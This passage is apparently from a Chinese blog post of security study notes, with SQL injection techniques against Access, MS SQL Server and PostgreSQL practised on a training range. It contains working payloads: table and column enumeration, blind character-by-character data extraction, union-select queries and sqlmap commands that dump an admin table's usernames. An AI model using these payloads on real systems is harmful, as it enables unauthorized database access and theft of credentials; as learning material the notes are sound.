+<h3 id="SQL-EXISTS-语法"><a href="#SQL-EXISTS-语法" class="headerlink" title="SQL EXISTS 语法"></a>SQL EXISTS 语法</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">EXISTS</span></span><br><span class="line">(<span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> table_name <span class="keyword">WHERE</span> <span class="keyword">condition</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Access数据库中的函数"><a href="#Access数据库中的函数" class="headerlink" title="Access数据库中的函数"></a>Access数据库中的函数</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select len(&quot;string&quot;)        查询给定字符串的长度</span><br><span class="line">select asc(&quot;a&quot;)             查询给定字符串的ascii值</span><br><span class="line">top  n                      查询前n条记录</span><br><span class="line">select mid(&quot;string&quot;,2,1)    查询给定字符串从指定索引开始的长度</span><br></pre></td></tr></table></figure>
+
+
+
+<pre><code>mid(string,start,length) 这个用来截取字符串的
+string是要截取的字符串
+start是截取的字符串开始索引
+length是要截取的字符串长度 
+</code></pre>
+<h2 id="2-1-盲注Access数据库"><a href="#2-1-盲注Access数据库" class="headerlink" title="2.1 盲注Access数据库"></a>2.1 <strong>盲注Access数据库</strong></h2><p>Access数据库特有的表是：<strong>msysobjects</strong>  ，所以可以用它来判断是否是Access数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exists(select * from msysobjects)  #如果这条语句正确，说明是Access数据库</span><br></pre></td></tr></table></figure>
+
+<p>Access没有数据库的概念，所有的表都是在同一个数据库下。所以，我们不用去判断当前的数据库名，并且access数据库中也不存在 database() 函数。</p>
+<p>对于判断存在哪些表，只能用以下枚举的方法来猜测是否存在某某表。 </p>
+<p>判断存在sql注入后，判断是否存在admin表，如果存在，正常查询，如果不存在，报语法错误。然后通过<strong>枚举表名爆破</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select* from  admin)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>猜测字段也是一样，只能通过枚举来猜测 </p>
+<p>判断有admin表后，再<strong>判断admin表有多少列</strong>，假如1-10正常查询，11列报语法报错，那说明有10列</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select * from admin order by 10)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>判断出存在的列数后，再<strong>判断具体的列名</strong>。以下语句判断是否存在name列，如果存在，正常查询，如果不存在，则报语法错误。然后再通过枚举列名爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and exists(select name from admin)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>猜测完表名和字段名后，我们就看看这个<strong>表里面有多少行数据</strong> ，如果&gt;99查询正确，&gt;100查询错误(这里是查询错误，而不是语法错误)，说明有100行数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and (select count(*) from information)&gt;100</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后在猜测每个字段具体的数据了 </p>
+<p>access数据库中没有 limit，就不能限制查询出来的行数。但是我们可以使用top命令，top 1是将查询的所有数据只显示第一行，所以 top3就是显示查询出来的前三行数据了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">猜测admin列的第一个数据的长度，如果大于5查询不出数据，大于4正常，说明admin列的第一个数据长度是5</span><br><span class="line">and (select top 1 len(admin)from admin)&gt;5</span><br><span class="line"></span><br><span class="line">猜测admin列的第一行数据的第一个字符的ascii码值，如果大于97查询不出数据，大于96正常，说明admin列的第一行数据的第一个字符的ascii值是97</span><br><span class="line">and (select top 1 asc(mid(admin,1,1))from admin)&gt;97 </span><br><span class="line">第一行数据的第二个字符</span><br><span class="line">and (select top 1 asc(mid(admin,2,1))from admin)&gt;97 </span><br><span class="line"></span><br><span class="line">从第二行开始，查询数据就得用另外的语句了,因为这里的top只能显示查询前几条数据，所以我们得用联合查询，先查询前两条，然后倒序，然后在找出第一条，这就是第二条数据。</span><br><span class="line">查询第二行admin列的长度</span><br><span class="line">and (select top 1 len(admin)  from ( select top 2 * from information order by id)  order by id desc)&gt;55</span><br><span class="line">下面是查询第2条数据的第3个字符</span><br><span class="line">and (select top 1 asc(mid(admin,3,1))  from ( select top 2 * from information order by id)  order by id desc)&gt;55</span><br><span class="line">查询第三条数据的第4个字符</span><br><span class="line">and (select top 1 asc(mid(admin,4,1))  from ( select top 3 * from information order by id)  order by id desc)&gt;55</span><br></pre></td></tr></table></figure>
+
+<p>注：在access中，中文也可以用<strong>asc函数</strong>来表示，</p>
+<p>例如：asc(mid(“中国”,1)) 表示 中 字的ascii值，可以用 <strong>chr</strong> （将ascll码变为对应值）来逆向得出值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asc(&quot;中&quot;) = -10544</span><br><span class="line">chr(-10544) = 中</span><br></pre></td></tr></table></figure>
+
+<p>​    </p>
+<h2 id="2-2-Sqlmap注入Access数据库"><a href="#2-2-Sqlmap注入Access数据库" class="headerlink" title="2.2 Sqlmap注入Access数据库"></a>2.2 Sqlmap注入Access数据库</h2><p>爆出access数据库存在的表，只能利用枚举的方式爆破。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;xxx&quot;  --tables</span><br></pre></td></tr></table></figure>
+
+
+<p>第一步问我们是否使用公共的库去爆破，我们选择：Y；</p>
+<p>第二步选择默认的库文件：1 </p>
+<p>第三步选择线程数：10</p>
+<p>可以看出爆出了两个数据表：admin 、 specialty</p>
+<p>爆出admin数据库中的列名</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;xxx&quot; -T admin --columns</span><br></pre></td></tr></table></figure>
+
+
+<p>意思和上一步也是一样的。 </p>
+<p>爆出admin表下username列的所有数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;xxx&quot; -T admin -C username --dump-all</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="3-sqlSever数据库-注入（msSQL）"><a href="#3-sqlSever数据库-注入（msSQL）" class="headerlink" title="3 sqlSever数据库 注入（msSQL）"></a>3 sqlSever数据库 注入（msSQL）</h1><p>参考链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xishaonian/p/6173644.html">https://www.cnblogs.com/xishaonian/p/6173644.html</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2022/11/25/8MBGvgPzr6Wo7km.png" alt="image-20221112195346808"></p>
+<h2 id="3-1-墨者靶场sqlsever"><a href="#3-1-墨者靶场sqlsever" class="headerlink" title="3.1 墨者靶场sqlsever"></a>3.1 墨者靶场sqlsever</h2><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://s2.loli.net/2022/11/25/S7AUP1OGpJYmLeq.png" alt="image-20221112200120511" style="zoom:33%;" />
+
+<p>1、判断数据库类型：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2022/11/25/Nx6P1ojrEJTtYev.png" alt="image-20221112200210487"></p>
+<p>如果是mssql就正常显示</p>
+<p>2、判断数据库版本</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2022/11/25/wuzMGsHp3JNjBQI.png" alt="image-20221112200300428"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">and substring((select @@version),22,4)=&#x27;2005&#x27;--</span><br></pre></td></tr></table></figure>
+
+<p>适用于无回显模式，后面的2005就是数据库版本，返回正常就是2005的复制代码第一条语句执行</p>
+<p>如果是2005版就有回显</p>
+<h1 id="4、postgreSQL"><a href="#4、postgreSQL" class="headerlink" title="4、postgreSQL"></a>4、postgreSQL</h1><p>链接：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yilishazi/p/14710349.html">https://www.cnblogs.com/yilishazi/p/14710349.html</a></p>
+<p>常见函数（整体）：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT version() #查看版本信息</span><br><span class="line">#查看用户</span><br><span class="line">SELECT user;</span><br><span class="line">SELECT current_user;</span><br><span class="line">SELECT session_user;</span><br><span class="line">SELECT usename FROM pg_user;#这里是usename不是username</span><br><span class="line">SELECT getpgusername();</span><br><span class="line">#查看当前数据库</span><br><span class="line">SELECT current_database()10 CURRENT_SCHEMA()  查看当前数据库    sqlmap跑注入使用此函数。</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-1-墨者postgresql"><a href="#4-1-墨者postgresql" class="headerlink" title="4.1 墨者postgresql"></a>4.1 墨者postgresql</h2><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://s2.loli.net/2022/11/25/k41DJPl2sHA5Qoe.png" alt="image-20221112210842964" style="zoom:33%;" />
+
+
+
+<p><strong>首先查询字段数：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order by 4</span><br></pre></td></tr></table></figure>
+
+<p>猜出有四个四段</p>
+<p><strong>看回显</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select &#x27;1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;4&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>注意要打逗号，</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2022/11/25/UxPYyoum7aj5LCG.png" alt="image-20221112211058412"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2022/11/25/jAMw562xRLhUN4y.png" alt="image-20221112211110862"></p>
+<p><strong>爆库</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select &#x27;1&#x27;,(select current_database()),&#x27;3&#x27;,&#x27;4&#x27; </span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="./s2.loli.net/2022/11/25/654fWjrh3H78zdG.png" alt="image-20221112211220684"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://leekoscn.github.io">LIKE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://leekoscn.github.io/posts/fa45560e3521/">https://leekoscn.github.io/posts/fa45560e3521/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://leekoscn.github.io" target="_blank">Tranquility</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%B0%8F%E8%BF%AA-day15-Oracle%EF%BC%8CMongoDB%E3%80%81access%E3%80%81msSQL%E3%80%81postgresql%E6%B3%A8%E5%85%A5/">小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)</a></div><div class="post_share"><div class="social-share" data-image="/img/hello-world.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechatpay.png" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/wechatpay.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/ee597ef53526/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="onerror=null;src='/img/hello-world.webp'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">小迪-day16（报错注入，延时、布尔盲注）</div></div></a></div><div class="next-post pull-right"><a href="/posts/44edbd1b2eba/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="onerror=null;src='/img/hello-world.webp'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">小迪-day14(注入类型之提交注入)</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LIKE</div><div class="author-info__description">这是个人博客，分享技术的地方~</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">215</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">31</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/leekoscn"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/leekoscn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://blog.csdn.net/qq_61839115?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=2500495325&amp;website=www.oicqzone.com" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:2500495325@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1%E3%80%81sqlmap%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">1、sqlmap使用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2%E3%80%81Access%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">2、Access注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EXISTS-%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">2.1.</span> <span class="toc-text">EXISTS 运算符</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-EXISTS-%E8%AF%AD%E6%B3%95"><span class="toc-number">2.1.1.</span> <span class="toc-text">SQL EXISTS 语法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Access%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">Access数据库中的函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-%E7%9B%B2%E6%B3%A8Access%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.3.</span> <span class="toc-text">2.1 盲注Access数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-Sqlmap%E6%B3%A8%E5%85%A5Access%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">2.4.</span> <span class="toc-text">2.2 Sqlmap注入Access数据库</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-sqlSever%E6%95%B0%E6%8D%AE%E5%BA%93-%E6%B3%A8%E5%85%A5%EF%BC%88msSQL%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">3 sqlSever数据库 注入（msSQL）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E5%A2%A8%E8%80%85%E9%9D%B6%E5%9C%BAsqlsever"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 墨者靶场sqlsever</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#4%E3%80%81postgreSQL"><span class="toc-number">4.</span> <span class="toc-text">4、postgreSQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#4-1-%E5%A2%A8%E8%80%85postgresql"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 墨者postgresql</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/50182c4e289e/" title="小迪-day17(编解码、二次注入、DNSlog盲注)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day17(编解码、二次注入、DNSlog盲注)"/></a><div class="content"><a class="title" href="/posts/50182c4e289e/" title="小迪-day17(编解码、二次注入、DNSlog盲注)">小迪-day17(编解码、二次注入、DNSlog盲注)</a><time datetime="2023-08-22T10:05:22.621Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/ee597ef53526/" title="小迪-day16（报错注入，延时、布尔盲注）"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day16（报错注入，延时、布尔盲注）"/></a><div class="content"><a class="title" href="/posts/ee597ef53526/" title="小迪-day16（报错注入，延时、布尔盲注）">小迪-day16（报错注入，延时、布尔盲注）</a><time datetime="2023-08-22T10:05:22.618Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/fa45560e3521/" title="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)"/></a><div class="content"><a class="title" href="/posts/fa45560e3521/" title="小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)">小迪-day15(Oracle，MongoDB、access、msSQL、postgresql注入)</a><time datetime="2023-08-22T10:05:22.617Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/44edbd1b2eba/" title="小迪-day14(注入类型之提交注入)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day14(注入类型之提交注入)"/></a><div class="content"><a class="title" href="/posts/44edbd1b2eba/" title="小迪-day14(注入类型之提交注入)">小迪-day14(注入类型之提交注入)</a><time datetime="2023-08-22T10:05:22.615Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b6e16bf4bb82/" title="小迪-day13(MySQL注入)"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="/img/hello-world.webp" onerror="this.onerror=null;this.src='/img/hello-world.webp'" alt="小迪-day13(MySQL注入)"/></a><div class="content"><a class="title" href="/posts/b6e16bf4bb82/" title="小迪-day13(MySQL注入)">小迪-day13(MySQL注入)</a><time datetime="2023-08-22T10:05:22.611Z" title="发表于 2023-08-22 18:05:22">2023-08-22</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/hello-world.webp')"><div id="footer-wrap"><div class="copyright">&copy;2022-09 - 2023 By LIKE</div><div class="framework-info"><a href="https://beian.miit.gov.cn"  style="color:#fff" target="_blank">赣ICP备2022008842号</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'e5J90iDkXMWhU5UNlEX1I2hO-gzGzoHsz',
+      appKey: 'esLROw9j3xLk2nV4tQkKaih1',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>function electric_clock_injector_config(){
+                var parent_div_git = document.getElementsByClassName('col l3 hide-on-med-and-down expanded')[0];
+                var item_html = '<div class="card-widget card-clock"> <div class="card-glass"> <div class="card-background"><div class="card-content"> <div id="hexo_electric_clock"> <img id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-clock/clock/images/weather/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading" class="entered loading"></div></div></div></div></div>';
+                console.log('已挂载electric_clock')
+                // parent_div_git.innerHTML=item_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",item_html) // 有报错，但不影响使用(支持pjax跳转)
+            }if( document.getElementsByClassName('col l3 hide-on-med-and-down expanded')[0] && (location.pathname ==='all'|| 'all' ==='all')){
+
+            electric_clock_injector_config()
+        } </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax  src="https://cdn.jsdelivr.net/gh/Zfour/hexo-electric-clock@1.0.6/clock.js"></script><script data-pjax>
+  function butterfly_clock_injector_config(){
+    var parent_div_git = document.getElementsByClassName('col l3 hide-on-med-and-down expanded')[0];
+    var item_html = '<div class="card-widget card-clock"> <div class="card-glass"> <div class="card-background"><div class="card-content"> <div id="hexo_electric_clock"> <img id="card-clock-loading" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://cdn.jsdelivr.net/gh/Zfour/Butterfly-clock/clock/images/weather/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading" class="entered loading"></div></div></div></div></div>';
+    console.log('已挂载butterfly_clock')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_clock_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_clock_injector_config();
+  }
+  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://unpkg.zhimg.com/hexo-butterfly-clock/lib/clock.min.js"></script><!-- hexo injector body_end end -->
+        <style>
+            [bg-lazy] {
+                background-image: none !important;
+                background-color: #eee !important;
+            }
+        </style>
+        <script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(e){e.imageLazyLoadSetting.processImages=t;var n=e.imageLazyLoadSetting.isSPA,i=e.imageLazyLoadSetting.preloadRatio||1,r=o();function o(){var t=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")),e=Array.prototype.slice.call(document.querySelectorAll("[bg-lazy]"));return t.concat(e)}function t(){n&&(r=o());for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(e.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];e=function(){r=r.filter(function(t){return o!==t})},(t=o).hasAttribute("bg-lazy")?(t.removeAttribute("bg-lazy"),e&&e()):(n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,t.removeAttribute("data-original"),e&&e()},t.src!==i&&(n.src=i))}()}function a(){clearTimeout(t.tId),t.tId=setTimeout(t,500)}t(),document.addEventListener("scroll",a),e.addEventListener("resize",a),e.addEventListener("orientationchange",a)}(this);</script></body></html>
